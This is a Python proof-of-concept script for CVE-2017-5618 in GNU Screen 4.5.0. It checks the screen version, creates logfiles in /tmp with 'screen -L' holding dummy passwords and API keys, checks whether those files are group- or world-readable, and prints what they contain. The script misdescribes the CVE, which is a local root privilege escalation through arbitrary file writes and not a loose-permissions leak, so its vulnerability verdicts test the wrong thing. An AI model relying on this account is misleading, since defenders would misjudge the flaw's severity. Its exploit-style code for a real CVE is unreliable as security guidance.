#!/usr/bin/env python3
"""
CVE-2017-5618 - GNU Screen Logfile Permissions Vulnerability
Simple PoC Exploit

This script demonstrates the logfile permissions vulnerability in GNU Screen 4.5.0
where the -L option creates files with insecure permissions, potentially exposing
sensitive terminal session data.
"""

import os
import sys
import subprocess
import time
import stat


def check_screen_version():
    """Check if vulnerable version of screen is present"""
    try:
        result = subprocess.run(['screen', '-v'], capture_output=True, text=True)
        version_line = result.stdout.strip()
        print(f'[*] Detected: {version_line}')

        if '4.05.00' in version_line or '4.5.0' in version_line:
            print('[!] Vulnerable version detected!')
            return True
        else:
            print('[*] Version may not be vulnerable')
            return False
    except Exception as e:
        print(f'[!] Error checking screen version: {e}')
        return False


def exploit_logfile_permissions():
    """Demonstrate the logfile permissions vulnerability"""
    print('\n[*] Testing CVE-2017-5618 - Logfile Permissions Vulnerability')
    print('=' * 60)

    # Test file path
    test_logfile = f'/tmp/cve_2017_5618_test_{os.getpid()}'

    try:
        # Remove any existing test file
        if os.path.exists(test_logfile):
            os.remove(test_logfile)

        print(f'[*] Creating logfile: {test_logfile}')

        # Use vulnerable -L option to create logfile
        cmd = [
            'screen',
            '-L',
            test_logfile,
            '-d',
            '-m',
            'echo',
            'Sensitive data: password123',
        ]
        print(f'[*] Executing: {" ".join(cmd)}')

        result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)

        # Wait for file creation
        time.sleep(2)

        if os.path.exists(test_logfile):
            # Check file permissions
            file_stat = os.stat(test_logfile)
            file_mode = stat.filemode(file_stat.st_mode)
            octal_perms = oct(file_stat.st_mode)[-3:]

            print(f'[+] Logfile created successfully!')
            print(f'[+] File: {test_logfile}')
            print(f'[+] Permissions: {file_mode} ({octal_perms})')
            print(f'[+] Owner: UID {file_stat.st_uid}, GID {file_stat.st_gid}')

            # Check for vulnerability indicators
            vulnerable = False

            # Check if group-readable
            if file_stat.st_mode & stat.S_IRGRP:
                print('[!] VULNERABILITY: File is group-readable!')
                vulnerable = True

            # Check if world-readable
            if file_stat.st_mode & stat.S_IROTH:
                print('[!] VULNERABILITY: File is world-readable!')
                vulnerable = True

            # Check if permissions are too permissive (should be 600)
            if octal_perms != '600':
                print(
                    f'[!] VULNERABILITY: Insecure permissions {octal_perms} (should be 600)'
                )
                vulnerable = True

            if vulnerable:
                print('\n[!] CVE-2017-5618 CONFIRMED!')
                print('[!] Logfiles created with insecure permissions')
                print('[!] Potential for information disclosure')

                # Try to read the file content
                try:
                    with open(test_logfile, 'r') as f:
                        content = f.read()
                        if content.strip():
                            print(f'[!] Exposed content: {repr(content.strip())}')
                        else:
                            print(
                                '[*] Logfile is empty (session may not have completed)'
                            )
                except PermissionError:
                    print('[*] Cannot read logfile (permission denied)')
                except Exception as e:
                    print(f'[*] Error reading logfile: {e}')
            else:
                print('[*] File permissions appear secure')

            return vulnerable

        else:
            print('[!] Logfile was not created')
            return False

    except subprocess.TimeoutExpired:
        print('[*] Screen command timed out')
        return False
    except Exception as e:
        print(f'[!] Error during exploit: {e}')
        return False
    finally:
        # Cleanup
        try:
            if os.path.exists(test_logfile):
                os.remove(test_logfile)
        except:
            pass


def demonstrate_info_disclosure():
    """Demonstrate information disclosure scenario"""
    print('\n[*] Demonstrating Information Disclosure Scenario')
    print('=' * 50)

    sensitive_log = f'/tmp/sensitive_session_{os.getpid()}'

    try:
        # Create a session with sensitive information
        sensitive_cmd = [
            'screen',
            '-L',
            sensitive_log,
            '-d',
            '-m',
            'bash',
            '-c',
            'echo "=== Sensitive Session Log ==="; '
            'echo "Username: admin"; '
            'echo "Password: secret123"; '
            'echo "API Key: sk-1234567890abcdef"; '
            'echo "Database: mysql://user:pass@db.example.com/prod"; '
            'echo "Session completed"; '
            'sleep 1',
        ]

        print('[*] Creating screen session with sensitive data...')
        subprocess.run(sensitive_cmd, timeout=10)

        # Wait for session to complete
        time.sleep(3)

        if os.path.exists(sensitive_log):
            file_stat = os.stat(sensitive_log)
            print(f'[+] Sensitive logfile: {sensitive_log}')
            print(f'[+] Permissions: {oct(file_stat.st_mode)[-3:]}')

            # Check if we can read sensitive information
            try:
                with open(sensitive_log, 'r') as f:
                    content = f.read()

                if any(
                    keyword in content
                    for keyword in ['Password:', 'API Key:', 'mysql://']
                ):
                    print('[!] CRITICAL: Sensitive information exposed!')
                    print('[!] Leaked credentials found in logfile:')
                    print('-' * 40)
                    print(content)
                    print('-' * 40)
                    return True
                else:
                    print('[*] No sensitive patterns detected')

            except Exception as e:
                print(f'[!] Error reading sensitive logfile: {e}')
        else:
            print('[!] Sensitive logfile not created')

    except Exception as e:
        print(f'[!] Error in info disclosure demo: {e}')
    finally:
        # Cleanup
        try:
            if os.path.exists(sensitive_log):
                os.remove(sensitive_log)
        except:
            pass

    return False


def main():
    print('CVE-2017-5618 - GNU Screen Logfile Permissions Vulnerability PoC')
    print('================================================================')

    # Check if we have a vulnerable version
    if not check_screen_version():
        print('[*] This system may not be vulnerable')
        print('[*] Continuing with exploit attempt anyway...')

    # Test the basic vulnerability
    vuln_confirmed = exploit_logfile_permissions()

    # Demonstrate information disclosure
    info_disclosed = demonstrate_info_disclosure()

    # Summary
    print('\n' + '=' * 60)
    print('EXPLOIT SUMMARY')
    print('=' * 60)

    if vuln_confirmed or info_disclosed:
        print('[!] VULNERABILITY CONFIRMED!')
        print('[!] System is vulnerable to CVE-2017-5618')
        print('[!] GNU Screen creates logfiles with insecure permissions')
        if info_disclosed:
            print('[!] Sensitive information disclosure demonstrated')
    else:
        print('[*] Vulnerability not clearly demonstrated')
        print('[*] System may have mitigations or patches applied')

    print('\n[*] Recommendation: Upgrade to GNU Screen 4.5.1 or later')
    print('[*] CVE-2017-5618 was fixed in Screen 4.5.1')


if __name__ == '__main__':
    main()
